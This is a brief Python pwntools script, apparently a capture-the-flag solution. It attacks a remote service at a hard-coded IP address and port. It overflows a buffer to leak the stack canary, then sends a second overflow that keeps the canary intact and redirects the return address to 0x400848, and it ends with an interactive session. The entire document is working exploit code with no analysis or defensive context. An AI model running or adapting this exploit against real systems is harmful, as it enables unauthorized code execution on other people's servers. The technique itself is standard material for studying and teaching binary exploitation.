from pwn import *
p = remote('139.155.83.108',10001)
p.recvuntil("canary, how 2 bypass?")

payload = b'\x90' * 0x209
p.send(payload)
p.recvuntil(payload)
canary = b'\x00' + p.recv(7)
print("Canary leaked:{}",hex(int.from_bytes(canary,byteorder='little',signed=False)))

payload = b'\x90' * 0x208 + canary + p64(0xbadbeef)+p64(0x400848)
p.send(payload)
p.interactive()